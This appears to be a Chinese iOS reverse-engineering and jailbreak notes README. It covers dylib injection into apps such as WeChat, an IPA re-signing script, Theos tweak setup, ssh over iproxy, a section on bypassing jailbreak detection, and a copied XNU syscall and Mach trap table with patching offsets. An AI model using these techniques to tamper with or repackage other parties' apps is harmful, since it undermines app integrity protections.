# iOS逆向工程越狱开发 
# iOS Jailbreak Develop/hook/Reverse
# 我的微信公众号: Cydia
![Cydia](https://github.com/XLsn0w/XLsn0w/raw/XLsn0w/XLsn0w/Cydiapple.png?raw=true)
# 我的私人公众号: XLsn0w
![XLsn0w](https://github.com/XLsn0w/iOS-Reverse/blob/master/XLsn0w.jpeg?raw=true)

## Lua 脚本
```
     Lua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放，
     其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。
     
     Lua的应用场景：

     游戏开发
     独立应用脚本
     Web 应用脚本
     扩展和数据库插件如：MySQL Proxy 和 MySQL
     WorkBench
     安全系统，如入侵检测系统


     触动精灵的应用场景：

     编写自己App的脚本完成自动化测试
     开挂刷机
     微信机器人（包括开发任意应用的机器人）
     因此我们可以轻易做出上面效果图的功能，但是需要移动设备必须是以下其一：

     完美越狱的iOS设备
     Root权限的Android设备
     具有Root权限的Android模拟器
     提醒：Android与iOS兼容大部分函数。
     模拟器连接编辑器比较麻烦，具体操作请查看官方文档。推荐使用天天模拟器，具有别的模拟器不具备的特性。
     开发所需的必备工具：

     具备windows环境开发
     在移动设备上安装触动精灵App
     IDE 脚本编辑器TouchSprite Studio
     取点抓色器TSColorPicker
```

## Mach-O 的组成结构

---- Header 包含该二进制文件的一般信息

            字节顺序、架构类型、加载指令的数量等。

---- Load commands 一张包含很多内容的表

                   内容包括区域的位置、符号表、动态符号表等。

---- __Data/__TEXT 包含Segement / Section

```
在工程编译时 , 所产生的 Mach-O 可执行文件中会预留出一段空间 , 
这个空间其实就是符号表 , 存放在 _DATA 数据段中  ( 因为 _DATA 段在运行时是可读可写的 ) 

编译时 : 工程中所有引用了共享缓存区中的系统库方法 , 其指向的地址设置成符号地址 ,  
( 例如工程中有一个 NSLog , 那么编译时就会在 Mach-O 中创建一个 NSLog 的符号 , 工程中的 NSLog 就指向这个符号 ) 

运行时 : 当 dyld将应用进程加载到内存中时 , 根据 load commands 中列出的需要加载哪些库文件 , 去做绑定的操作 
( 以 NSLog 为例 , dyld 就会去找到 Foundation 中 NSLog 的真实地址写到 _DATA 段的符号表中 NSLog 的符号上面 )
```
                   
## hook iOS App
### 1. 利用代码注入
1. .framework
下载yololib
将其复制到 usr/local/bin 中 
手动 cd 到Mach-O 文件这个目录(eg. XLsn0w.framework)
```
yololib Wechat Frameworks/XLsn0w.framework/XLsn0w
```

2. .dylib (eg. XLsn0w.dylib)
```
yololib "$TARGET_APP_PATH/$APP_BINARY" "Frameworks/XLsn0w.dylib"
```

### 2. 汇编修改Mach-O
修改 Mach-O 文件的 Load Commands

## Shell (.sh脚本)
```
# ${SRCROOT} 它是工程文件所在的目录
TEMP_PATH="${SRCROOT}/Temp"
#资源文件夹，我们提前在工程目录下新建一个APP文件夹，里面放ipa包
ASSETS_PATH="${SRCROOT}/APP"
#目标ipa包路径
TARGET_IPA_PATH="${ASSETS_PATH}/*.ipa"
#清空Temp文件夹
rm -rf "${SRCROOT}/Temp"
mkdir -p "${SRCROOT}/Temp"



#----------------------------------------
# 1. 解压IPA到Temp下
unzip -oqq "$TARGET_IPA_PATH" -d "$TEMP_PATH"
# 拿到解压的临时的APP的路径
TEMP_APP_PATH=$(set -- "$TEMP_PATH/Payload/"*.app;echo "$1")
# echo "路径是:$TEMP_APP_PATH"


#----------------------------------------
# 2. 将解压出来的.app拷贝进入工程下
# BUILT_PRODUCTS_DIR 工程生成的APP包的路径
# TARGET_NAME target名称
TARGET_APP_PATH="$BUILT_PRODUCTS_DIR/$TARGET_NAME.app"
echo "app路径:$TARGET_APP_PATH"

rm -rf "$TARGET_APP_PATH"
mkdir -p "$TARGET_APP_PATH"
cp -rf "$TEMP_APP_PATH/" "$TARGET_APP_PATH"



#----------------------------------------
# 3. 删除extension和WatchAPP.个人证书没法签名Extention
rm -rf "$TARGET_APP_PATH/PlugIns"
rm -rf "$TARGET_APP_PATH/Watch"



#----------------------------------------
# 4. 更新info.plist文件 CFBundleIdentifier
#  设置:"Set : KEY Value" "目标文件路径"
/usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier $PRODUCT_BUNDLE_IDENTIFIER" "$TARGET_APP_PATH/Info.plist"


#----------------------------------------
# 5. 给MachO文件上执行权限
# 拿到MachO文件的路径WeChat
APP_BINARY=`plutil -convert xml1 -o - $TARGET_APP_PATH/Info.plist|grep -A1 Exec|tail -n1|cut -f2 -d\>|cut -f1 -d\<`
#上可执行权限
chmod +x "$TARGET_APP_PATH/$APP_BINARY"



#----------------------------------------
# 6. 重签名第三方 FrameWorks
TARGET_APP_FRAMEWORKS_PATH="$TARGET_APP_PATH/Frameworks"
if [ -d "$TARGET_APP_FRAMEWORKS_PATH" ];
then
for FRAMEWORK in "$TARGET_APP_FRAMEWORKS_PATH/"*
do


#签名
/usr/bin/codesign --force --sign "$EXPANDED_CODE_SIGN_IDENTITY" "$FRAMEWORK"
done
fi

```

## Tagged Pointer

1️⃣ : Tagged Pointer 专门用来存储小的对象，例如 NSNumber 和 NSDate

2️⃣ : Tagged Pointer 指针的值不再是地址了，而是真正的值。所以，实际上它不再是一个对象了，它只是一个披着对象皮的普通变量而已。所以，它的内存并不存储在堆中，也不需要 malloc 和 free

3️⃣ :  在内存读取上有着 3 倍的效率，创建时比以前快 106 倍 ( objc_msgSend 能识别 Tagged Pointer，比如 NSNumber 的 intValue 方法，直接从指针提取数据 )

4️⃣ : 使用 Tagged Pointer 后，指针内存储的数据变成了 Tag + Data，也就是将数据直接存储在了指针中 .

## lldb po
p 是 expr -的缩写。它的工作是把接收到的参数在当前环境下进行编译，然后打印出对应的值。

po 即 expr -o-。它所做的操作与p相同。如果接收到的参数是一个指针，那么它会调用对象的 description 方法并打印。如果接收到的参数是一个 core foundation 对象，那么它会调用 CFShow 方法并打印。如果这两个方法都调用失败，那么 po 打印出和 p 相同的内容。

总的来说，po 相对于 p 会打印出更多内容。一般在工作中，用 p 即可，因为 p 操作较少，效率更高。

p即是print，也是expression --的缩写，与po不同，它不会打出对象的详细信息，只会打印出一个$符号，数字，再加上一段地址信息。由于po命令下，对象的description 有可能被随便乱改，没有输出地址消息。

$符号在LLDB中代表着变量的分配。每次使用p后，会自动为你分配一个变量，后面再次想使用这个变量时，就可以直接使用。我们可以直接使用这个地址做一些转换，获取对象的信息

## 什么是 dyld?

dyld 是苹果的动态加载器 , 用来加载 image ( 注意: 这里的 image 不是指图片 , 而是 Mach-O 格式的二进制文件  )

当程序启动时 , 系统内核会首先加载 dyld , 而 dyld 会将我们的 APP 所依赖的各种库加载到内存中 ,
其中就包括 libobjc ( OC 和 runtime ) , 这些工作是在 APP 的 main 函数执行之前完成的.

_objc_init 是 Object-C - runtime 库的入口函数 , 在这里主要是读取 Mach-O 文件 OC 对应的 Segment section , 
并根据其中的数据代码信息 , 完成为 OC 的内存布局 , 以及初始化 runtime 相关的数据结构.

## dpkg-deb
```
1、dpkg-deb -x ./original.deb ./repackage
2、得到头文件class-dump -H original.app -o ./header
 
但如果对其逆向，修改后，要重新打包，则步骤如下：
1、建立文件夹目录
./repackage/DEBIAN
 
2、拆包
dpkg-deb -x ./original.deb ./repackage
执行之后，目录结构为：
./repackage/DEBIAN
./repackage/Applications
./repackage/Library
./repackage/usr
 
3、得到原deb信息
dpkg-deb -e ./original.deb repackage/DEBIAN
在DEBIAN目录下会得到包含control等5个文件
 
4、打包
dpkg-deb -b repackage new.deb

```

## dpkg

安装deb -i == -install
```
$ dpkg -i cn.xlsn0w.deb
```

卸载deb -r == -remove
```
$ dpkg -r cn.xlsn0w.deb
```

查看deb信息 -s == -see
```
$ dpkg -s cn.xlsn0w.deb 
```

## iOS大神金字塔
1.OC基础、UI层：熟练掌握各种组件的业务开发

2.runloop、runtime层：熟练掌握OC实现原理，定位各种异常问题

3.源码层：OC底层源码、比如objc、GNUStep 等源码，从底层原理上分析问题，解决问题

4.汇编层：熟悉OC在机器码层面实现，例如寄存器、汇编、Mach-O等

5.系统层：学习Drawin系统、BSD等

6.知识面的拓宽：Android、flutter、swift、shell、ruby、脚本等

7.硬件层：比如说集成电路、操作系统如何运转等等

## usbmuxd
usbmuxd将依赖于TCP/IP的命令的被连接方，通过本地端口映射。

用usb连接代替了网络连接，使得在没有网络的情况下也可以连接设备。

$  iproxy 2222 22 == 将本地电脑2222端口转发到usb连接设备22端口

### Makefile
```
DEBUG = false

THEOS_DEVICE_IP = localhost
THEOS_DEVICE_PORT = 2222

ARCHS = arm64 arm64e

TARGET = iphone:latest:11.0

THEOS_MAKE_PATH = /opt/theos/makefiles

include $(THEOS)/makefiles/common.mk

TWEAK_NAME = XLsn0wTweak

XLsn0wTweak_FILES = Tweak.xm

include $(THEOS_MAKE_PATH)/tweak.mk

after-install::
	install.exec "killall -9 SpringBoard"

```

1.设备安装openSSH插件, 安装usbmuxd(brew install usbmuxd)
2.把当前连接设备的22端口(SSH端口)映射到电脑的2222端口:(iproxy 2222 22)
3.theos想和设备22端口通信，直接和本地的2222端口通信即可
```
iproxy 2222 22 
```

### ssh连接设备IP==连接电脑本地localhost 127.0.0.1
```
ssh -p 2222 root@127.0.0.1

ssh root@localhost -p 22222
```

## dpkg -r packageName 卸载deb插件
1. ssh连接手机(ssh -p 2222 root@127.0.0.1)
2. 使用dpkg -r packageName (packageName是创建Tweak项目时输入的包名)
3. 注销SpringBoard 

```
iPhone-6:~ root# dpkg -r cn.xlsn0w.dock:iphoneos-arm
(Reading database ... 1896 files and directories currently installed.)
Removing cn.xlsn0w.dock (1.1.6-2) ...
```

### 执行make install命令安装deb插件
```
$     make install
==> Installing…
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
RSA key fingerprint is SHA256:9BPzMfuq0HFe2lkxXBRpdZSwg+if/NSbn1m2+7RudqM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.
Selecting previously unselected package cn.xlsn0w.dock.
(Reading database ... 3893 files and directories currently installed.)
Preparing to unpack /tmp/_theos_install.deb ...
Unpacking cn.xlsn0w.dock (1.1.5-4) ...
Setting up cn.xlsn0w.dock (1.1.5-4) ...
install.exec "killall -9 SpringBoard"
```
![iPod touch4](https://github.com/XLsn0w/Cydia/blob/master/iOS%206.1.6%20jailbreak.JPG?raw=true)

## .app手动压缩改后缀.ipa
```
1: 新建“Payload”文件夹;
2: 将.app包放到Payload中;
3: 在Payload文件夹上右键压缩成zip，然后将生成的.zip文件后缀改成.ipa即可
```

## macOS/iOS 签名工具
```
$ brew install ldid
```
 ### ldid工具：ldid是mac上的命令行工具，可以用于导出的签名文件、对文件进行重签名等操作。
 ### codesign工具：Mac上的命令行工具、也可以用于权限签名操作。

### dlopen 和 dlsym 方法动态加载库和调用函数
### Linux/unix/macOS/iOS 提供了使用 dlopen 和 dlsym 方法动态加载库和调用函数

UNIX 诞生于 20 世纪 60 年代末，
Windows 诞生于 20 世纪 80 年代中期，
Linux 诞生于 20 世纪 90 年代初，
可以说 UNIX 是操作系统中的"老大哥", Windows 和 Linux 都参考了 UNIX。

dlopen 打开一个库，获取句柄。
dlsym 在打开的库中查找符号的值。
dlclose 关闭句柄。
dlerror 返回一个描述最后一次调用dlopen、dlsym，或 dlclose 的错误信息的字符串。

## Makefile
Makefile关系到了整个工程的编译规则。一个工程中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，
Makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，
因为makefile就像一个Shell脚本一样，其中也可以执行操作系统的命令。

makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率。
make是一个命令工具，是一个解释makefile中指令的命令工具，一般来说，大多数的IDE都有这个命令，比如：Delphi的make，Visual C++的nmake，Linux下GNU的make。
可见，makefile都成为了一种在工程方面的编译方法。

## 绕过越狱检测
最近，苹果自己的App Store中有相当数量的应用程序正在实施一些程序，以检查运行该应用程序本身的设备的真实性，从而禁止或禁止某些功能甚至是整个应用程序的使用。
显而易见的原因是越狱的先天安全风险您的设备（例如，银行公司不希望将某些流氓键盘记录程序伪装成对您的帐户信息的调整来伪装）。

但是，在大多数情况下，公司似乎担心调整可能会绕过应用程序中实施的某些限制。视频流应用为此而臭名昭著。这些公司不希望用户绕过对何时何地可以流式传输其内容的限制，
因此，他们没有做负责任的事情并混淆了他们的限制尝试，而是阻止了所有越狱设备，无论它们是否出于恶意或缺乏意图。

## Kernel Syscalls -> https://www.theiphonewiki.com/wiki/Kernel_Syscalls
```
像往常一样，Args进入其普通寄存器，如R0 / X0中的arg1。Syscall＃输入IP（即过程内的，而不是指令指针！），也称为R12 / X16。

像在所有ARM中一样（在Android中也是如此），内核条目是由SVC命令（某些调试器和ARM方言中的SWI）完成的。在内核端，作为ExceptionVectorsBase的一部分安装了一个低级CPU异常处理程序（fleh_swi），并且-在发出SWI / SVC时-控件被转移到该地址。该处理程序可以检查系统调用号，以区分POSIX调用（非否定）和Mach陷阱（否定）。

Args go in their normal registers, like arg1 in R0/X0, as usual. Syscall # goes in IP (that's intra-procedural, not instruction pointer!), a.k.a R12/X16.

As in all ARM (i.e. also on Android) the kernel entry is accomplished by the SVC command (SWI in some debuggers and ARM dialects). On the kernel end, a low level CPU exception handler (fleh_swi) is installed as part of the ExceptionVectorsBase, and - upon issuing a SWI/SVC - control is transferred to that address. This handler can check the syscall number to distinguish between POSIX calls (non negative) and Mach traps (negative).

Unix
Usage
MOV IP, #x // number from following list into Intraprocedural, a.k.a. r12 on arm32 and x16 on arm64
SVC 0x80   // Formerly, SWI (software interrupt)
For example, arm32:


(gdb) disass chown
0x30d2ad54 <chown>:	mov	r12, #16	       ; 0x10, being # of chown
0x30d2ad58 <chown+4>:	svc	0x00000080
And arm64:

libsystem_kernel.dylib`chown:
    0x1866c6084 <+0>:  mov    x16, #0x10
    0x1866c6088 <+4>:  svc    #0x80
Most of these are the same as you would find in the XNU open source kernel, with ARM idiosyncrasies aside (and #372, ledger)

XNU中的系统调用表被称为“ sysent”，出于明显的原因（例如syscall挂钩），它不再是公共符号。但是，找到系统及其调用非常简单。尽管i0nic提出了一种基于导出的kdebug符号查找系统的启发式方法，但这是不可靠的，因为该符号不再被导出。更好的方法是进入struct sysent条目本身的模式，即-如bsd / sys / sysent.h中所定义：
sysent
The system call table in XNU is known as "sysent", and is no longer a public symbol, for obvious reasons (e.g. syscall hooking). It is fairly straightforward, however, to find the sysent and its calls. While i0nic proposes a heuristic of finding the sysent based on the exported kdebug symbol, this is unreliable, as the symbol is no longer exported. A better way is to home in on the pattern of the struct sysent entries itself, i.e - as defined in bsd/sys/sysent.h:


struct sysent {         /* system call table */
        int16_t         sy_narg;        /* number of args */
        int8_t          sy_resv;        /* reserved  */
        int8_t          sy_flags;       /* flags */
        sy_call_t       *sy_call;       /* implementing function */
        sy_munge_t      *sy_arg_munge32; /* system call arguments munger for 32-bit process */
        sy_munge_t      *sy_arg_munge64; /* system call arguments munger for 64-bit process */
        int32_t         sy_return_type; /* system call return types */
        uint16_t        sy_arg_bytes;   /* Total size of arguments in bytes for
                                         * 32-bit system calls
                                         */
};

Because system calls arguments are set in stone, it is straightforward to write code to find the signature of the first few syscalls (syscall, exit, fork..), and from there calculate the other sysent entries. A program to do so reliable on iOS has, in fact, been written, and produces the following output for iOS 6.0b1:

List of system calls from iOS 6.0 GM
note: Even though a syscall is present in the table, it does not in any way imply it is functional. Auditing, for example, is not enabled in iOS (no CONFIG_AUDIT in the XNU build). Most of these syscalls are the same as those of OS X, with the exception of ledger (which actually makes a comeback in OS X Mountain Lion), and 434+ (CONFIG_EMBEDDED).

A good reference on these can be found at Wiley's OS X and iOS Internals online appendix. The joker tool (shown below) can be downloaded from the same site.

$ joker -u ~/Documents/projects/iOS.6.0.iPod4.kernel 
This is an ARM binary. Applying iOS kernel signatures
Entry point is 0x80085084....This appears to be XNU 2107.2.33
Syscall names are @2a70f0
Sysent offset in file/memory (for patching purposes): 0x2ef0c0/0x802f00c0

Suppressing enosys (0x800b3429)  T = Thumb
1. exit                  801d4a74 T
2. fork                  801d7980 T
3. read                  801eb584 T
4. write                 801eb958 T
5. open                  800b13a4 T
6. close                 801ccab4 T
7. wait4                 801d56bc T
9. link                  800b18e8 T
10. unlink               800b1ff0 T
12. chdir                800b0c60 T
13. fchdir               800b0af0 T
14. mknod                800b14bc T
15. chmod                800b2b40 T
16. chown                800b2c9c T
18. getfsstat            800b088c T
20. getpid               801dc20c T
23. setuid               801dc4c0 T
24. getuid               801dc290 T
25. geteuid              801dc2a0 T
26. ptrace               801e812c T
27. recvmsg              8020a8fc T
28. sendmsg              8020a444 T
29. recvfrom             8020a528 T
30. accept               80209dfc T
31. getpeername          8020abc8 T
32. getsockname          8020ab18 T
33. access               800b24ac T
34. chflags              800b2928 T
35. fchflags             800b29f0 T
36. sync                 800b0320 T
37. kill                 801dfdcc T
39. getppid              801dc214 T
41. dup                  801cab04 T
42. pipe                 801edbe4 T
43. getegid              801dc318 T
46. sigaction            801deee8 T
47. getgid               801dc308 T
48. sigprocmask          801df42c T
49. getlogin             801dd0e8 T
50. setlogin             801dd160 T
51. acct                 801c54ec T
52. sigpending           801df5d0 T
53. sigaltstack          801dfd10 T
54. ioctl                801ebd1c T
55. reboot               801e8090 T
56. revoke               800b43f8 T
57. symlink              800b1b58 T
58. readlink             800b282c T
59. execve               801d4448 T
60. umask                800b43d0 T
61. chroot               800b0d30 T
65. msync                801d84d0 T
66. vfork                801d7018 T
73. munmap               801d857c T
74. mprotect             801d85b0 T
75. madvise              801d8668 T
78. mincore              801d86d4 T
79. getgroups            801dc328 T
80. setgroups            801dd02c T
81. getpgrp              801dc21c T
82. setpgid              801dc3c8 T
83. setitimer            801e7b78 T
85. swapon               8021be68 T
86. getitimer            801e7a30 T
89. getdtablesize        801ca6dc T
90. dup2                 801caf54 T
92. fcntl                801cb420 T
93. select               801ebfc8 T
95. fsync                800b3238 T
96. setpriority          801dd494 T
97. socket               802098a4 T
98. connect              80209e1c T
100. getpriority          801dd388 T
104. bind                 80209970 T
105. setsockopt           8020aa30 T
106. listen               80209adc T
 111. sigsuspend           801df5f8 T
116. gettimeofday         801e7840 T
117. getrusage            801de22c T
118. getsockopt           8020aa94 T
120. readv                801eb810 T
121. writev               801ebbb0 T
122. settimeofday         801e789c T
123. fchown               800b2dac T
124. fchmod               800b2c70 T
126. setreuid             801dc80c T
127. setregid             801dcba0 T
128. rename               800b3428 T
131. flock                801ce20c T
132. mkfifo               800b1798 T
133. sendto               8020a168 T
134. shutdown             8020aa00 T
135. socketpair           8020a00c T
136. mkdir                800b3d1c T
137. rmdir                800b3d5c T
138. utimes               800b2e60 T
139. futimes              800b3034 T
140. adjtime              801e79a0 T
142. gethostuuid          801ed6a4 T
147. setsid               801dc384 T
151. getpgid              801dc224 T
152. setprivexec          801dc1f4 T
153. pread                801eb774 T
154. pwrite               801ebad0 T
157. statfs               800b03c0 T
158. fstatfs              800b0678 T
159. unmount              800afe88 T
165. quotactl             800b03bc T
167. mount                800af068 T
169. csops                801dafd0 T
170. 170  old table       801db4bc T
173. waitid               801d5ab4 T
180. kdebug_trace         801c2db4 T
181. setgid               801dc9a4 T
182. setegid              801dcab0 T
183. seteuid              801dc710 T
184. sigreturn            8021e7e4 T
185. chud                 8021d4f4 T
187. fdatasync            800b32b0 T
188. stat                 800b2588 T
189. fstat                801ccfec T
190. lstat                800b26d4 T
191. pathconf             800b27c8 T
192. fpathconf            801cd048 T
194. getrlimit            801de074 T
195. setrlimit            801dd93c T
196. getdirentries        800b3f94 T
197. mmap                 801d7fc0 T
199. lseek                800b2068 T
200. truncate             800b30b4 T
201. ftruncate            800b3174 T
202. __sysctl             801e2478 T
203. mlock                801d8820 T
204. munlock              801d8878 T
205. undelete             800b1cf0 T
216. mkcomplex            800b12c4 T
220. getattrlist          8009b060 T
221. setattrlist          8009b0d8 T
222. getdirentriesattr    800b44e0 T
223. exchangedata         800b469c T
225. searchfs             800b48dc T
226. delete               800b202c T
227. copyfile             800b32cc T
228. fgetattrlist         80098488 T
229. fsetattrlist         8009b7e0 T
230. poll                 801ec72c T
231. watchevent           801ed054 T
232. waitevent            801ed1f8 T
233. modwatch             801ed368 T
234. getxattr             800b5550 T
235. fgetxattr            800b568c T
236. setxattr             800b578c T
237. fsetxattr            800b5898 T
238. removexattr          800b5994 T
239. fremovexattr         800b5a5c T
240. listxattr            800b5b1c T
241. flistxattr           800b5c00 T
242. fsctl                800b4dd4 T
243. initgroups           801dcea8 T
244. posix_spawn          801d351c T
245. ffsctl               800b5474 T
250. minherit             801d8630 T
266. shm_open             8020eb24 T
267. shm_unlink           8020f604 T
268. sem_open             8020df80 T
269. sem_close            8020e718 T
270. sem_unlink           8020e4e0 T
271. sem_wait             8020e76c T
272. sem_trywait          8020e834 T
273. sem_post             8020e8d8 T
274. sem_getvalue         8020e97c T
275. sem_init             8020e974 T
276. sem_destroy          8020e978 T
277. open_extended        800b11d8 T
278. umask_extended       800b4380 T
279. stat_extended        800b2530 T
280. lstat_extended       800b267c T
281. fstat_extended       801ccdd0 T
282. chmod_extended       800b2a30 T
283. fchmod_extended      800b2b74 T
284. access_extended      800b21a0 T
285. settid               801dcd2c T
286. gettid               801dc2b0 T
287. setsgroups           801dd03c T
288. getsgroups           801dc37c T
289. setwgroups           801dd040 T
290. getwgroups           801dc380 T
291. mkfifo_extended      800b16f4 T
292. mkdir_extended       800b3b30 T
294. shared_region_check_np 8021c3a4 T
296. vm_pressure_monitor  8021cb08 T
297. psynch_rw_longrdlock 802159ac T
298. psynch_rw_yieldwrlock 80215c60 T
299. psynch_rw_downgrade  80215c68 T
300. psynch_rw_upgrade    80215c64 T
301. psynch_mutexwait     80212bd8 T
302. psynch_mutexdrop     80213b9c T
303. psynch_cvbroad       80213bf0 T
304. psynch_cvsignal      802141c0 T
305. psynch_cvwait        80214648 T
306. psynch_rw_rdlock     80214d7c T
307. psynch_rw_wrlock     802159b0 T
308. psynch_rw_unlock     80215c6c T
309. psynch_rw_unlock2    80215f64 T
310. getsid               801dc254 T
311. settid_with_pid      801dcdcc T
312. psynch_cvclrprepost  80214c7c T
313. aio_fsync            801c5ed0 T
314. aio_return           801c60a8 T
315. aio_suspend          801c6330 T
316. aio_cancel           801c5a48 T
317. aio_error            801c5e24 T
318. aio_read             801c6088 T
319. aio_write            801c6544 T
320. lio_listio           801c6564 T
322. iopolicysys          801de420 T
323. process_policy       8021a72c T
324. mlockall             801d88b4 T
325. munlockall           801d88b8 T
327. issetugid            801dc4b0 T
328. __pthread_kill       801dfa44 T
329. __pthread_sigmask    801dfaa4 T
330. __sigwait            801dfb54 T
331. __disable_threadsignal 801df720 T
332. __pthread_markcancel 801df73c T
333. __pthread_canceled   801df784 T
334. __semwait_signal     801df924 T
336. proc_info            80218618 T
338. stat64               800b25d4 T
339. fstat64              801cd028 T
340. lstat64              800b2720 T
341. stat64_extended      800b2624 T
342. lstat64_extended     800b2770 T
343. fstat64_extended     801cd00c T
344. getdirentries64      800b4340 T
345. statfs64             800b06e0 T
346. fstatfs64            800b0828 T
347. getfsstat64          800b0a38 T
348. __pthread_chdir      800b0d28 T
349. __pthread_fchdir     800b0c58 T
350. audit                801c1a74 T
351. auditon              801c1a78 T
353. getauid              801c1a7c T
354. setauid              801c1a80 T
357. getaudit_addr        801c1a84 T
358. setaudit_addr        801c1a88 T
359. auditctl             801c1a8c T
360. bsdthread_create     80216ab8 T
361. bsdthread_terminate  80216d30 T
362. kqueue               801cf594 T
363. kevent               801cf614 T
364. lchown               800b2d94 T
365. stack_snapshot       801c520c T
366. bsdthread_register   80216d94 T
367. workq_open           802179e8 T
368. workq_kernreturn     80217e50 T
369. kevent64             801cf8ac T
370. __old_semwait_signal 801df7f8 T
371. __old_semwait_signal_nocancel 801df82c T
372. thread_selfid        80218354 T
373. ledger               801ed70c T
380. __mac_execve         801d4468 T
381. __mac_syscall        8027d0a8 T
382. __mac_get_file       8027cd50 T
383. __mac_set_file       8027cf98 T
384. __mac_get_link       8027ce74 T
385. __mac_set_link       8027d098 T
386. __mac_get_proc       8027c844 T
387. __mac_set_proc       8027c904 T
388. __mac_get_fd         8027cbfc T
389. __mac_set_fd         8027ce84 T
390. __mac_get_pid        8027c778 T
391. __mac_get_lcid       8027c9b8 T
392. __mac_get_lctx       8027ca7c T
393. __mac_set_lctx       8027cb38 T
394. setlcid              801dd228 T
395. getlcid              801dd310 T
396. read_nocancel        801eb5a4 T
397. write_nocancel       801eb978 T
398. open_nocancel        800b1434 T
399. close_nocancel       801ccad0 T
400. wait4_nocancel       801d56dc T
401. recvmsg_nocancel     8020a91c T
402. sendmsg_nocancel     8020a464 T
403. recvfrom_nocancel    8020a548 T
404. accept_nocancel      80209b1c T
405. msync_nocancel       801d84e8 T
406. fcntl_nocancel       801cb440 T
407. select_nocancel      801ebfe4 T
408. fsync_nocancel       800b32a8 T
409. connect_nocancel     80209e34 T
410. sigsuspend_nocancel  801df6b4 T
411. readv_nocancel       801eb830 T
412. writev_nocancel      801ebbd0 T
413. sendto_nocancel      8020a188 T
414. pread_nocancel       801eb794 T
415. pwrite_nocancel      801ebaf0 T
416. waitid_nocancel      801d5ad0 T
417. poll_nocancel        801ec74c T
420. sem_wait_nocancel    8020e788 T
421. aio_suspend_nocancel 801c6350 T
422. __sigwait_nocancel   801dfb8c T
423. __semwait_signal_nocancel 801df958 T
424. __mac_mount          800af08c T
425. __mac_get_mount      8027d2a0 T
426. __mac_getfsstat      800b08b0 T
427. fsgetpath            800b5ce4 T
428. audit_session_self   801c1a68 T
429. audit_session_join   801c1a6c T
430. fileport_makeport    801ce2f0 T
431. fileport_makefd      801ce494 T
432. audit_session_port   801c1a70 T
433. pid_suspend          8021c180 T
434. pid_resume           8021c1f0 T
435. pid_hibernate        8021c268 T
436. pid_shutdown_sockets 8021c2c0 T
438. shared_region_map_and_slide_np 8021c954 T
439. kas_info             8021cb50 T   ; Provides ASLR information to user space 
                                       ; (intentionally crippled in iOS, works in ML)
440. memorystatus_control 801e62a0 T   ;; Controls JetSam - supersedes old sysctl interface
441. guarded_open_np      801cead0 T  
442. guarded_close_np     801cebdc T

Mach
XNU also supports the Mach personality, which is distinct from that of the UNIX syscalls discussed above. Mach syscalls (on 32-bit systems like iOS) are encoded as negative numbers, which is clever, since POSIX system calls are all non-negative. For example, consider mach_msg_trap:

_mach_msg_trap:
0001a8b4        e1a0c00d        mov     ip, sp
0001a8b8        e92d0170        push    {r4, r5, r6, r8}
0001a8bc        e89c0070        ldm     ip, {r4, r5, r6}
0001a8c0        e3e0c01e        mvn     ip, #30 @ 0x1e    ; Move NEGATIVE -30 into IP (R12)
0001a8c4        ef000080        svc     0x00000080        ; issue a supervisor call
0001a8c8        e8bd0170        pop     {r4, r5, r6, r8}
0001a8cc        e12fff1e        bx      lr
..
_semaphore_signal_all_trap:
0001a8f8        e3e0c021        mvn     ip, #33 @ 0x21   ; NEGATIVE -33 into IP (R12)
0001a8fc        ef000080        svc     0x00000080
0001a900        e12fff1e        bx      lr

Mach system calls are commonly known as "traps", and are maintained in a Mach Trap table. iOS's fleh_swi handler (the kernel entry point on the other side of the "SWI" or "SVC" command) checks the system call number - if it is negative, it is flipped (2's complement), and interpreted as Mach trap instead.

mach_trap_table
In iOS 5.x, the mach_trap_table is not far from the page_size export, and right next to the trap names. kern_invalid is the equivalent of ENOSYS. All the traps are ARM Thumb. The joker binary can be used to find the Mach trap table, as well. The following shows iOS 6.0.b1's table:

$ ./joker -ls mach kernel.iPod4.iOS6.0b1
This is an ARM binary. Applying iOS kernel signatures
mach_trap_table offset in file (for patching purposes): 3064992 (0x2ec4a0)
Kern invalid should be 0x80027ec1. Ignoring those
..This appears to be XNU 2107.1.78
 10 _kernelrpc_mach_vm_allocate_trap         80014460 T
 12 _kernelrpc_mach_vm_deallocate_trap       800144cc T
 14 _kernelrpc_mach_vm_protect_trap          80014510 T
 16 _kernelrpc_mach_port_allocate_trap       80014564 T
 17 _kernelrpc_mach_port_destroy_trap        800145b4 T
 18 _kernelrpc_mach_port_deallocate_trap     800145f0 T
 19 _kernelrpc_mach_port_mod_refs_trap       8001462c T
 20 _kernelrpc_mach_port_move_member_trap    8001466c T
 21 _kernelrpc_mach_port_insert_right_trap   800146b0 T
 22 _kernelrpc_mach_port_insert_member_trap  80014710 T
 23 _kernelrpc_mach_port_extract_member_trap 80014754 T
 26 mach_reply_port                          8001b5b4 T
 27 thread_self_trap                         8001b598 T
 28 task_self_trap                           8001b578 T
 29 host_self_trap                           80019910 T
 31 mach_msg_trap                            80014ec0 T
 32 mach_msg_overwrite_trap                  80014d20 T
 33 semaphore_signal_trap                    80027188 T
 34 semaphore_signal_all_trap                8002720c T
 35 semaphore_signal_thread_trap             80027114 T
 36 semaphore_wait_trap                      800274b0 T
 37 semaphore_wait_signal_trap               80027658 T
 38 semaphore_timedwait_trap                 80027598 T
 39 semaphore_timedwait_signal_trap          8002773c T
 44 task_name_for_pid                        8021a838 T
 45 task_for_pid                             8021a688 T
 46 pid_for_task                             8021a63c T
 48 macx_swapon                              8021b414 T
 49 macx_swapoff                             8021b668 T
 51 macx_triggers                            8021b3f4 T
 52 macx_backing_store_suspend               8021b370 T
 53 macx_backing_store_recovery              8021b318 T
 58 pfz_exit                                 80027818 T
 59 swtch_pri                                800278e4 T
 60 swtch                                    8002781c T
 61 thread_switch                            80027ad4 T
 62 clock_sleep_trap                         80017520 T
 89 mach_timebase_info_trap                  80016658 T
 90 mach_wait_until_trap                     80016d20 T
 91 mk_timer_create_trap                     8001f2f4 T
